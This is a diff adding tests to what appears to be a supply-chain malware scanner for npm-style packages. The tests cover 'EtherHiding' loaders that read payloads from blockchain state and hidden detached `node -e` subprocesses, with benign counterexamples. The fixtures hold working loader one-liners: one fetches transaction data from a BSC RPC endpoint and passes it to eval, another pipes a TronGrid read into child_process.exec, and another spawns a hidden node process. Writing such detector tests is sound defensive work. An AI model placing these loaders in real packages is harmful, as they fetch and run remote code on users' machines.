@@ -298,6 +298,85 @@ test("#4 a package that merely mentions the word bun/deno does not fire", () => 
   assert.ok(!categories(report).includes("alternate-runtime-exec"));
 });
 
+// --- #6 EtherHiding on-chain loader + hidden self-node exec -----------------
+// The committed file is only a loader: it reads the real payload out of
+// blockchain state and executes it, so the code channel never changes and there
+// is no server to seize. Two independent signals close this: (a) a chain-read
+// primitive co-located with a code executor (onchain-c2-loader), and (b) a
+// detached/hidden `node -e` subprocess (eval-by-subprocess). Each is paired with
+// a negative case that must NOT fire — legit web3 libraries read chains
+// constantly, and legit tools spawn node.
+
+test("#6 chain-read (eth_getTransactionByHash) feeding eval BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "index.js":
+        'const r=await fetch("https://bsc-dataseed.binance.org/",{method:"POST",body:JSON.stringify({method:"eth_getTransactionByHash",params:[h]})}).then(x=>x.json());const p=r.result.input.slice(2);eval(Buffer.from(p,"hex").toString());'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "onchain-c2-loader").severity, "high");
+});
+
+test("#6 TronGrid latest-tx read + child_process executor BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "loader.js":
+        'const t=await fetch("https://api.trongrid.io/v1/accounts/TX/transactions?limit=1").then(r=>r.json());require("child_process").exec(t.data[0].raw_data.data);'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "onchain-c2-loader").severity, "high");
+});
+
+test("#6 a legit web3 tx-status read (chain-read, NO executor) does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "index.js":
+        'module.exports=async(provider,hash)=>{const tx=await provider.send("eth_getTransactionByHash",[hash]);return {mined:!!tx.blockNumber};};'
+    }
+  });
+  assert.ok(!categories(report).includes("onchain-c2-loader"));
+  assert.notEqual(report.verdict, "block");
+});
+
+test("#6 detached hidden `node -e` subprocess BLOCKS (eval-by-subprocess)", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "index.js":
+        'require("child_process").spawn("node",["-e",payload],{stdio:"ignore",windowsHide:true,detached:true});'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "code-execution").severity, "high");
+});
+
+test("#6 plain `node -e` subprocess without evasion flags is REVIEW, not block", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "build.js": 'require("child_process").execSync("node -e \\"console.log(process.version)\\"");'
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "code-execution").severity, "medium");
+});
+
+test("#6 spawning node WITHOUT an inline-eval flag does not fire the hidden-exec HIGH", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "run.js": 'require("child_process").spawn("node",["./worker.js"],{detached:true,stdio:"ignore"});'
+    }
+  });
+  assert.ok(!report.findings.some((f) => f.category === "code-execution" && f.severity === "high"));
+  assert.notEqual(report.verdict, "block");
+});
+
 // --- #5 provenance is non-offsetting ---------------------------------------
 
 test("#5 valid provenance does not change a blocking verdict or raise the score", () => {
